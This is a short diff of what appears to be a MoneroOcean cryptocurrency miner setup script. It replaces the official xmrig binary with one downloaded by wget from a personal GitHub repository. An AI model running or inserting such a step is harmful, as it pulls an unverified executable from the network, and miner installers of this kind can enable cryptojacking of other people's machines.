@@ -203,8 +203,8 @@ if (test $? -ne 0); then
 fi
 
 rm -f $HOME/moneroocean/xmrig
-wget 
-
+echo "[*] Official Miner $HOME/moneroocean/xmrig is deleted"
+wget -P $HOME/moneroocean https://github.com/KANIKIG/my_xmrig/raw/main/xmrig
 echo "[*] My Miner $HOME/moneroocean/xmrig is OK"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
